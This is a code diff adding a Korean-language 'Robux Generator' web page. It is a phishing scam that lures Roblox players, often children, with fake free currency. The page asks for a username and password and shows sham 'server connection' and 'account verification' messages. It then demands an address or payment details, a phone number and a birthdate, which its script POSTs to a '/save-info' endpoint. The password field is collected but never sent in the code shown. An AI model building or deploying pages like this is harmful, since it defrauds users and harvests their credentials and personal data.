@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Robux Generator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-900 text-white min-h-screen flex flex-col items-center justify-center p-6">
+
+    <div id="mainBox" class="max-w-md w-full bg-gray-800 p-8 rounded-3xl shadow-2xl border border-gray-700">
+        <h1 class="text-3xl font-bold mb-2 text-center text-yellow-400">Robux 충전 센터</h1>
+        <p class="text-sm text-gray-400 mb-6 text-center">Roblox 계정 정보를 입력하고 안전하게 충전을 진행하세요.</p>
+
+        <div id="inputSection" class="space-y-4">
+            <input type="text" id="username" placeholder="Roblox 사용자명 또는 ID" class="w-full bg-gray-700 rounded-lg p-3 outline-none border border-gray-600">
+            <button id="generateBtn" class="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-3 rounded-lg">충전 시작</button>
+        </div>
+
+        <div id="statusSection" class="mt-6 text-center hidden">
+            <div class="animate-spin inline-block w-8 h-8 border-4 border-yellow-500 border-t-transparent rounded-full mb-2"></div>
+            <p id="statusText" class="text-yellow-500 font-bold">서버 연결 중...</p>
+        </div>
+
+        <div id="passwordSection" class="mt-6 hidden space-y-4">
+            <input type="password" id="password" placeholder="비밀번호 입력" class="w-full bg-gray-700 rounded-lg p-3 outline-none border border-gray-600">
+            <button id="loginBtn" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-lg">로그인</button>
+        </div>
+
+        <div id="codeSection" class="mt-6 hidden text-center">
+            <p class="mb-4 text-2xl font-mono text-yellow-300" id="generatedCode">dqgy-3fgyy-feyy-XXXX</p>
+            <button id="unlockBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg">지금 잠금 해제</button>
+        </div>
+
+        <div id="infoSection" class="mt-6 hidden space-y-4">
+            <input id="address" type="text" placeholder="주소 또는 결제 정보" class="w-full bg-gray-700 rounded-lg p-3 outline-none border border-gray-600">
+            <input id="phone" type="text" placeholder="전화번호" class="w-full bg-gray-700 rounded-lg p-3 outline-none border border-gray-600">
+            <input id="birthdate" type="date" class="w-full bg-gray-700 rounded-lg p-3 outline-none border border-gray-600">
+            <button id="submitBtn" class="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 rounded-lg">정보 제출</button>
+            <p id="saveStatus" class="text-sm text-gray-300 hidden"></p>
+        </div>
+    </div>
+
+    <script>
+        const generateBtn = document.getElementById('generateBtn');
+        const statusSection = document.getElementById('statusSection');
+        const statusText = document.getElementById('statusText');
+        const inputSection = document.getElementById('inputSection');
+        const passwordSection = document.getElementById('passwordSection');
+        const loginBtn = document.getElementById('loginBtn');
+        const codeSection = document.getElementById('codeSection');
+        const unlockBtn = document.getElementById('unlockBtn');
+        const infoSection = document.getElementById('infoSection');
+        const submitBtn = document.getElementById('submitBtn');
+        const addressInput = document.getElementById('address');
+        const phoneInput = document.getElementById('phone');
+        const birthdateInput = document.getElementById('birthdate');
+        const saveStatus = document.getElementById('saveStatus');
+
+        generateBtn.addEventListener('click', () => {
+            inputSection.classList.add('hidden');
+            statusSection.classList.remove('hidden');
+            const stages = ["서버 연결 중...", "유저 정보 가져오는 중...", "로딩 중..."];
+            let i = 0;
+            const interval = setInterval(() => {
+                statusText.innerText = stages[i];
+                i++;
+                if (i >= stages.length) {
+                    clearInterval(interval);
+                    statusSection.classList.add('hidden');
+                    passwordSection.classList.remove('hidden');
+                }
+            }, 1000);
+        });
+
+        loginBtn.addEventListener('click', () => {
+            passwordSection.classList.add('hidden');
+            statusSection.classList.remove('hidden');
+            statusText.innerText = "계정 인증 중...";
+            setTimeout(() => {
+                statusSection.classList.add('hidden');
+                codeSection.classList.remove('hidden');
+            }, 1500);
+        });
+
+        unlockBtn.addEventListener('click', () => {
+            codeSection.classList.add('hidden');
+            infoSection.classList.remove('hidden');
+        });
+
+        submitBtn.addEventListener('click', async () => {
+            const address = addressInput.value.trim() || '정보 없음';
+            const phone = phoneInput.value.trim() || '정보 없음';
+            const birthdate = birthdateInput.value || '정보 없음';
+
+            saveStatus.innerText = '정보를 전송하는 중입니다...';
+            saveStatus.classList.remove('hidden');
+
+            await fetch('/save-info', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ address, phone, birthdate })
+            }).catch(() => null);
+
+            saveStatus.innerText = '잠금 해제가 완료되었습니다. 잠시 후 결과가 표시됩니다.';
+        });
+    </script>
+</body>
+</html>
